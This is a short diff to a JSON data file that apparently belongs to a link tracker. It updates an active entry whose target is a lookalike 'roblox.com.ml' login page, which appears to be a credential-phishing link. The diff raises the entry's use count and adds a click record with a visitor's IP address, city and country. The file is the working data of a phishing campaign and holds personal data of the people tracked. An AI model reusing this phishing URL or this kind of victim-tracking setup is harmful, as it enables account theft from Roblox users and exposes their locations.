@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 796,
+    "useCount": 797,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6480,6 +6480,14 @@
         "city": "Columbus",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777164930532,
+        "ip": "129.222.206.58",
+        "country": "Nigeria",
+        "city": "Lagos",
+        "flag": "🇳🇬",
+        "countryCode": "NG"
       }
     ]
   },
